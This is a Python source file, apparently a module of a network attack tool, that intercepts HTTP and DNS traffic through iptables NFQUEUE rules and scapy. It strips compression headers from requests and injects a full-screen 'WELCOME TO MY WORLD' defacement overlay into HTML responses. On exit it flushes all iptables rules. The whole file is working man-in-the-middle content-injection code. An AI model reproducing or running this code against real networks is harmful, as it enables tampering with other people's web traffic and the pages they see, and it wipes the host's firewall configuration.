import os
import socket
import re
import nfqueue as nf
from scapy.all import *


class HttpModifyActionModule:
    '''Modifies HTTP packets injecting payloads into content'''
    def __init__(self):
        pass

    def print_basic_info(self):
        pass

    def print_extended_info(self):
        pass

    def set_options(self):
        self.init_os_settings()

    def init_os_settings(self):
        insertOUT = "iptables -I OUTPUT -j NFQUEUE --queue-num 1 \
            -p tcp --dport 80"
        insertOUT2 = "iptables -I OUTPUT -j NFQUEUE --queue-num 1 \
            -p tcp --sport 80"

        insertIN = "iptables -I INPUT -j NFQUEUE --queue-num 1 \
            -p tcp --sport 80"
        insertIN2 = "iptables -I INPUT -j NFQUEUE --queue-num 1 \
            -p tcp --dport 80"

        insertOUTDNS = "iptables -I OUTPUT -j NFQUEUE --queue-num 1 \
            -p udp --dport 53"
        insertOUT2DNS = "iptables -I OUTPUT -j NFQUEUE --queue-num 1 \
            -p udp --sport 53"

        insertINDNS = "iptables -I INPUT -j NFQUEUE --queue-num 1 \
            -p udp --sport 53"
        insertIN2DNS = "iptables -I INPUT -j NFQUEUE --queue-num 1 \
            -p udp --dport 53"

        self.q = nf.queue()
        self.q.open()
        self.q.bind(socket.AF_INET)
        self.q.set_callback(self.modify_packet)
        self.q.create_queue(1)
        os.system(insertIN)
        os.system(insertIN2)
        os.system(insertOUT)
        os.system(insertOUT2)

        os.system(insertINDNS)
        os.system(insertIN2DNS)
        os.system(insertOUTDNS)
        os.system(insertOUT2DNS)

    def run(self):
        try:
            self.q.try_run()
        except KeyboardInterrupt:
            flush = "iptables -F; iptables -X;"

            self.q.unbind(socket.AF_INET)
            self.q.close()

            os.system(flush)

    def clear_module_settings(self):
        pass

    def modify_packet(self, i, payload):
        data = payload.get_data()
        pkt = IP(data)

        if Raw not in pkt:
            payload.set_verdict(nf.NF_ACCEPT)
            return

        load = pkt.load.split('\r\n\r\n', 1)
        header = load[0]
        content = ''

        if self.is_main_request(header):
            header = self.strip_accept_encoding(header)
            self.update_packet(pkt, header, content)

            payload.set_verdict_modified(nf.NF_ACCEPT, str(pkt), len(pkt))
            pkt.display()

            return

        elif not self.is_main_response(header):
            payload.set_verdict(nf.NF_ACCEPT)
            return

        if len(load) == 1:
            payload.set_verdict(nf.NF_ACCEPT)
            return

        content = load[1]
        content = self.deface_content(content)
        print 'HTML/Text Response'

        pkt = self.update_packet(pkt, header, content)
        pkt.display()
        payload.set_verdict_modified(nf.NF_ACCEPT, str(pkt), len(pkt))

    def deface_content(self, content):
        html_tag_start = content.find('<html')
        partition = content[html_tag_start:].find('>') + html_tag_start + 1

        src = "http://starecat.com/content/wp-content/uploads/dont-worry-im-from-tech-support-cat-fixing-computer.jpg"

        injection = '''
            <div style="width:100%;height:100%;position:fixed;z-index:99998;background-color:#FFF">
                <img style="left:50%;margin-left:-324px;text-align:center;position:fixed;z-index:99998;top:200px" src="''' + src + '''">
                <h3 style="font-size:76px;color:red;position:fixed;text-align:center;margin-top:40px;width:100%;z-index:99999">WELCOME TO MY WORLD</h3>
            </div>
                       '''

        if html_tag_start != -1:
            continue_len = partition + len(injection)
            content = content[:partition] + injection + content[continue_len:]

        return content

    def is_main_response(self, header):
        header_min = header.replace(' ', '').lower()

        if 'content-type:text/html' in header_min:
            return True

        return False

    def is_main_request(self, header):
        head = (header.split('\r\n', 1))[0]
        m = re.search(
            '^(\s)*(get|post)(\s)*((/)|(.*(\.html|\.php|\.asp)))(\s)*(http).*',
            head.lower())

        if m is not None:
            return True

        return False

    def update_packet(self, pkt, header, content):
        pkt.load = header + '\r\n\r\n' + content

        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum

        pkt = pkt.__class__(str(pkt))

        return pkt

    def strip_accept_encoding(self, header):
        headers = header.split('\r\n')

        header = ''

        for h in headers:
            if 'accept-encoding' in h.lower():
                continue

            header += h + '\r\n'

        return header
